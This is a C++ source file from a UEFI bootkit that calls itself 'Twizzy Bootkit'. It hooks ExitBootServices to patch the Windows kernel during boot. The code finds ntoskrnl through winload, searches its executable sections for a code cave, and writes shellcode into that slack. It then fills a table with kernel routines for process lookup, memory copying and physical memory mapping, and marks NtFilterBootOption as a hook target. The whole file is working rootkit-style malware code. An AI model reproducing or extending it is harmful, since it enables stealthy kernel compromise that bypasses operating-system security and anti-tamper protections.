#pragma once
#include "hook_handler.hpp"
#include "log.hpp"
#include "tools.hpp"
#include "context.hpp"
#include <stddef.h>
#include <hook_handler_shellcode.hpp>

#ifndef IMAGE_FIRST_SECTION
#define IMAGE_FIRST_SECTION(ntheader) \
    ((EFI_IMAGE_SECTION_HEADER*)((uint8_t*)(ntheader) + \
    sizeof(UINT32) + \
    sizeof(EFI_IMAGE_FILE_HEADER) + \
    ((EFI_IMAGE_NT_HEADERS64*)(ntheader))->FileHeader.SizeOfOptionalHeader))
#endif

namespace ebs
{
  static inline uint64_t align_up(uint64_t value, uint64_t alignment)
  {
    return (value + alignment - 1) & ~(alignment - 1);
  }

  uint64_t find_code_cave(uint64_t base, uint64_t needed_size)
  {
    if (!base || needed_size == 0) return 0;

    EFI_IMAGE_DOS_HEADER* dos = (EFI_IMAGE_DOS_HEADER*)base;
    EFI_IMAGE_NT_HEADERS64* nt = (EFI_IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    EFI_IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    uint64_t best_cave = 0;
    uint64_t best_size = 0;
    char best_name[9] = {0};

    log::serial_fmt("[Twizzy] Scanning caves in ntoskrnl %p (need %llx bytes)\r\n", base, needed_size);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
      EFI_IMAGE_SECTION_HEADER* sec = &sections[i];
      UINT32 chars = sec->Characteristics;

      if (!(chars & 0x20000000)) continue;        // executable
      bool writable = (chars & 0x80000000) != 0;

      uint64_t virt = sec->Misc.VirtualSize;
      uint64_t raw  = sec->SizeOfRawData;

      if (virt > 0x400000 || raw <= virt + 0x200) continue;

      uint64_t slack_start = base + sec->VirtualAddress + virt;
      uint64_t slack_size  = raw - virt;

      slack_start = (slack_start + 0xF) & ~0xFULL;
      slack_size  = raw - (slack_start - (base + sec->VirtualAddress));

      if (slack_size < needed_size) continue;

      char sec_name[9] = {0};
      CopyMem(sec_name, sec->Name, 8);

      log::serial_fmt("[Twizzy]   [%.8s] slack @ %p  size 0x%llx  (w:%d)\r\n", 
                      sec_name, slack_start, slack_size, writable);

      bool is_text = (sec_name[0]=='.' && sec_name[1]=='t' && sec_name[2]=='e' && sec_name[3]=='x' && sec_name[4]=='t');

      if ((!is_text && slack_size > best_size) || best_cave == 0)
      {
        best_cave = slack_start;
        best_size = slack_size;
        CopyMem(best_name, sec_name, 8);
      }
    }

    if (best_cave)
    {
      log::serial_fmt("[Twizzy] Best cave: %p in [%.8s] (0x%llx bytes)\r\n", best_cave, best_name, best_size);
      return best_cave;
    }

    log::serial("[Twizzy] No cave found!\r\n");
    return 0;
  }

  EFI_EXIT_BOOT_SERVICES original_exit_boot_services = 0;
  uint64_t pending_function_ptr = 0;
  uint64_t pending_hook_address = 0;
  uint64_t pending_runtime_data = 0;

  EFI_STATUS EFIAPI exit_boot_services_hook(EFI_HANDLE image_handle, uint64_t map_key)
  {
    log::serial("[Twizzy Bootkit] ExitBootServices called\r\n");

    gBS->ExitBootServices = original_exit_boot_services;

    uint64_t return_address = (uint64_t)_ReturnAddress();
    uint64_t winload = tools::get_base_from_address(return_address);
    globals::winload_base = winload;

    uint64_t osl_loader_block = *(uint64_t*)(winload + 0x21bf98);
    loader_parameter_block_t* loader_parameter_block =
      (loader_parameter_block_t*)osl_loader_block;

    context::switch_context(context::application_context);

    kldr_data_table_entry_t ntoskrnl = tools::get_base_from_list(
      &loader_parameter_block->load_order_list_head,
      (const CHAR16*)L"ntoskrnl.exe");

    uint64_t ntos = (uint64_t)ntoskrnl.dll_base;
    globals::ntoskrnl_base = ntos;

    constexpr uint64_t runtime_data_size = 0x80; // 16 qwords

    uint64_t runtime_offset = align_up(sizeof(hook_handler_shellcode), 0x10);
    uint64_t cave = find_code_cave(ntos, runtime_offset + runtime_data_size);
    if (!cave)
    {
      log::serial("[Twizzy] no cave found, aborting\r\n");
      context::switch_context(context::firmware_context);
      return original_exit_boot_services(image_handle, map_key);
    }

    CopyMem((void*)cave, hook_handler_shellcode, sizeof(hook_handler_shellcode));

    uint64_t* runtime_data = (uint64_t*)(cave + runtime_offset);
    SetMem(runtime_data, runtime_data_size, 0);

    runtime_data[0] = ntos;
    runtime_data[1] = tools::find_nt_filter_boot_option_by_scan(ntos);
    runtime_data[2] = tools::get_export(ntos, "PsLookupProcessByProcessId");
    runtime_data[3] = tools::get_export(ntos, "PsGetProcessSectionBaseAddress");
    runtime_data[4] = tools::get_export(ntos, "MmCopyMemory");
    runtime_data[5] = tools::get_export(ntos, "MmMapIoSpaceEx");
    runtime_data[6] = tools::get_export(ntos, "MmUnmapIoSpace");
    runtime_data[7] = tools::get_export(ntos, "MmGetVirtualForPhysical");
    runtime_data[8] = tools::get_export(ntos, "MmGetPhysicalMemoryRanges");
    runtime_data[9] = tools::get_export(ntos, "KeGetCurrentThread");
    runtime_data[10] = tools::get_export(ntos, "PsGetProcessPeb");
    runtime_data[11] = tools::get_export(ntos, "RtlInitAnsiString");
    runtime_data[12] = tools::get_export(ntos, "RtlAnsiStringToUnicodeString");
    runtime_data[13] = tools::get_export(ntos, "RtlCompareUnicodeString");
    runtime_data[14] = tools::get_export(ntos, "RtlFreeUnicodeString");
    runtime_data[15] = (uint64_t)RuntimeRequestHandler;

    g_runtime_data_ptr = (uint64_t)runtime_data;
    *(uint64_t*)(cave + SC_RUNTIME_PTR) = (uint64_t)runtime_data;
    pending_function_ptr = runtime_data[1];
    pending_hook_address = cave;
    pending_runtime_data = (uint64_t)runtime_data;

    log::serial_fmt("[Twizzy] ntoskrnl: %p\r\n", ntos);
    log::serial_fmt("[Twizzy] cave @ %p runtime @ %p\r\n", cave, (uint64_t)runtime_data);
    log::serial_fmt("[Twizzy] NtFilterBootOption: %p\r\n", runtime_data[1]);
    log::serial_fmt("[Twizzy] C++ handler registered: %p\r\n", runtime_data[15]);

    context::switch_context(context::firmware_context);

    log::serial("[Twizzy Bootkit] calling original ExitBootServices\r\n");
    return original_exit_boot_services(image_handle, map_key);
  }

  void create_hook()
  {
    original_exit_boot_services = gBS->ExitBootServices;
    gBS->ExitBootServices = exit_boot_services_hook;
  }
}
